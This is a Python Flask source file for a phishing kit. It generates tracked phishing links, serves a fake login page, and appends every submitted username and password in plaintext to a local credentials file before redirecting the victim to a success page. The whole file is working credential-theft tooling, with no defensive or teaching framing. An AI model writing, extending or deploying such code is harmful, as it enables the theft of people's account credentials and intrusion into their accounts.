from flask import Flask, render_template, request, redirect, url_for
import uuid
import os

app = Flask(__name__)

# Storage directory
CAPTURED_FILE = "captured_data/credentials.txt"
PHISH_LINKS_DIR = "phishing_links/"

# Ensure directories exist
os.makedirs("captured_data", exist_ok=True)
os.makedirs("phishing_links", exist_ok=True)

# Home - generate phishing link
@app.route('/')
def index():
    phishing_id = str(uuid.uuid4())
    phishing_link = url_for('phishing_page', phishing_id=phishing_id, _external=True)
    
    #Log the generated link
    with open(os.path.join(PHISH_LINKS_DIR, "log.txt"), 'a') as f:
        f.write(f"{phishing_id}: {phishing_link}\n")

    return render_template('generate_link.html', phishing_link=phishing_link, phishing_id=phishing_id)


# Fake login page
@app.route('/phish/<phishing_id>', methods=['GET', 'POST'])
def phishing_page(phishing_id):
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open(CAPTURED_FILE, 'a') as file:
            file.write(f"[{phishing_id}] Username: {username}, Password: {password}\n")
        return redirect(url_for('success'))
    return render_template('login.html')

# Success page
@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
